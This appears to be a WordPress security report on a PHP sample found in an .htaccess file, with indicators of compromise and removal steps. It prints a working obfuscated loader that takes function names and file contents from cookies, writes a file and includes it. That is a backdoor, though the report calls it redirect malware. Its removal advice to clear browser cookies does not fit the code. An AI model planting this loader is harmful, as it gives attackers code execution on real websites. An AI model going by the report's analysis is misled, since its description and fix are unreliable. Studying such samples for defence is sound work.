---
title: "htaccess Cookie-Based Redirect Malware"
slug: "htaccess-cookie-based-redirect-malware"
reportDate: "2026-01-24"
threatType: "Redirect Malware"
severity: "High"
fileHash: "htaccess-v2"
detectedPaths: ["sample.txt"]
screenshots: ["/images/wordpress-threats/htaccess-v2_evidence-1.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Zero-Day (Unique)"
impact: "This malware can redirect users to phishing sites, harming website reputation and causing SEO penalties."
seenOn: "wp-content/.htaccess"
behavior: "Redirects users based on specific cookies to potentially malicious sites."
difficulty: "Moderate"
recurrence: "Medium"
numberOfSiteFixed: "Not specified by user."
---

## Technical Analysis
The malicious code uses a complex obfuscation pattern through PHP, leveraging the $_COOKIE superglobal array. It constructs strings based on specific cookie values and executes them as PHP code, ultimately performing redirections. The placement in the htaccess file suggests an additional layer of redirection, aligning with the user's observation regarding atypical htaccess redirection malware.

> **VirusTotal Analysis:** üõ°Ô∏è **Zero-Day / Fully Undetected.**

## Attack Chain
1. Step 1: The user visits the infected site, and the PHP code reads specific cookie values.
2. Step 2: It assembles the components into executable PHP functions based on cookie values.
3. Step 3: The constructed PHP script executes a redirection, potentially to a malicious site.

## Code Signature(s)

### FILE: `sample.txt`
```txt
<?php $c = $_COOKIE; $k = 0; $n = 5; $p = array(); $p[$k] = ''; while($n) { $p[$k] .= $c[36][$n]; if(!$c[36][$n+1]) { if(!$c[36][$n+2]) break; $k++; $p[$k] = ''; $n++; } $n = $n + 5 + 1; } $k = $p[0]() . $p[25]; if(!$p[18]($k)) { $n = $p[1]($k, $p[8]); $p[14]($n, $p[2] . $p[9]($p[7]($c[3]))); } include($k);
```


## Indicators of Compromise (IOCs)
- `$_COOKIE`
- `$c[36][$n]`
- `$p[0]()`
- `include($k)`
- `wp-admin`

## Removal Protocol
1. Step 1: Back up your site's htaccess file and other critical files.
1. Step 2: Replace the htaccess file with a standard and clean version typical of WordPress.
1. Step 3: Clear cookies in your browser to prevent the malware's obfuscated functions from executing.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
